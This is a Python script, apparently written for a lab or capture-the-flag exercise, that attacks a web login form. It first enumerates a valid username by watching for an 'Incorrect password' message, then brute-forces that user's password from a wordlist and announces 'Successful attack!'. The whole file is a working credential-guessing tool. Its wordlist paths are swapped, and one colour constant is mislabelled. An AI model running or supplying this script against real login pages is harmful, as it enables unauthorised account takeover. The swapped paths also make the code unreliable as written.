import requests
import sys

user_name = './passwords_list.txt' # Add path to user wordlist.
user_pass = './users_list.txt' # Add path to password wordlist.

with open(user_name, 'r') as file:
  users = file.read().splitlines()

with open(user_pass, 'r') as file:
  passwords = file.read().splitlines()

url = '' # Add login url

class Colors:
  RESET = '\033[0m'
  RED = '\033[91m'
  GREEN = '\x1b[32m'
  WHITE = '\x1b[30m'

def user():
  for user in users:
    data_body = {
      "username": user,
      "password": "123456"
    }
    response = requests.post(url, data=data_body)
    if "Incorrect password" in response.text:
      print(f"{Colors.GREEN}The valid user is: {user}")
      return user

def password(user, valid_passwords):
  for password in valid_passwords:
    validUser = user
    data_body = {
      "username": validUser,
      "password": password
    }
    response = requests.post(url, data=data_body)
    if "Incorrect password" not in response.text:
      print(f"{Colors.GREEN}The valid password is: {password}")
      print(f"{Colors.WHITE}Successful attack!")
      sys.exit()

def program():
  print(f"""{Colors.GREEN}
███████╗████████╗ █████╗ ██████╗ ████████╗██╗███╗   ██╗ ██████╗          
██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚══██╔══╝██║████╗  ██║██╔════╝          
███████╗   ██║   ███████║██████╔╝   ██║   ██║██╔██╗ ██║██║  ███╗         
╚════██║   ██║   ██╔══██║██╔══██╗   ██║   ██║██║╚██╗██║██║   ██║         
███████║   ██║   ██║  ██║██║  ██║   ██║   ██║██║ ╚████║╚██████╔╝██╗██╗██╗
╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝╚═╝
""")
  print(f"{Colors.WHITE}==========================================================")
  valid_user = user()
  if valid_user:
    password(valid_user, passwords)

program()